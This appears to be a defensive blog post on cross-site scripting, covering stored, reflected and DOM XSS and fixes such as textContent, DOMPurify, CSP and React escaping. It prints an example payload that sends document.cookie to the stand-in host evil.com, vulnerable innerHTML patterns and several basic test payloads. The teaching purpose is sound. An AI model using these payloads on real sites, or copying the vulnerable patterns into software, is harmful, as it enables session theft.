---
title: "XSS Attacks Are Still Everywhere in 2026: How to Actually Stop Them"
date: 2026-02-12
tags: ['XSS', 'Cybersecurity', 'Web Security', 'Frontend', 'Attacks']
---

# XSS Attacks Are Still Everywhere in 2026: How to Actually Stop Them

Cross-Site Scripting (XSS) is the second most common web vulnerability. It's been exploited for 25 years. Here's how it actually works and how to stop it.

## What Is XSS?

XSS happens when untrusted user input gets rendered as HTML/JavaScript in the browser.

```javascript
// The dangerous pattern:
document.getElementById('output').innerHTML = userInput;

// If userInput is:
"<script>document.location='https://evil.com?c='+document.cookie</script>"

// You just handed the attacker every user's session cookie
```

## Types of XSS

### Stored XSS (Worst)
Malicious script stored in DB, served to all users who visit the page.

```
Attacker submits comment: "<script>steal(document.cookie)</script>"
All users who view comments get their cookies stolen.
```

### Reflected XSS
Script in URL parameter, reflected back in response:

```
https://yoursite.com/search?q=<script>alert(1)</script>
```

If the search page renders the `q` param without sanitization, XSS fires.

### DOM XSS
JavaScript reads from URL and writes to DOM unsafely:

```javascript
// Vulnerable:
document.getElementById('name').innerHTML = 
  new URLSearchParams(location.search).get('name');
```

## The Fixes

### 1. Escape Output (Always)

```javascript
// Never use innerHTML with user input
// Use textContent instead
element.textContent = userInput; // Safe — renders as text, not HTML

// Or use a sanitization library
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userInput);
```

### 2. Content Security Policy (CSP)

```
Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{random}'
```

Even if XSS is injected, CSP can prevent scripts from executing.

### 3. React (and Modern Frameworks) Help

```jsx
// React escapes by default — this is SAFE
return <div>{userInput}</div>;

// This is DANGEROUS — bypasses React's protection
return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
```

The name `dangerouslySetInnerHTML` is a deliberate warning. Treat it as one.

### 4. Sanitize Server-Side Too

Never trust that client-side validation is sufficient. Sanitize and validate on the server.

## Test Your Own App

```bash
# Basic XSS test payloads to try on input fields:
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
"><script>alert(1)</script>
```

If an alert fires, you have a vulnerability. Fix before you ship.

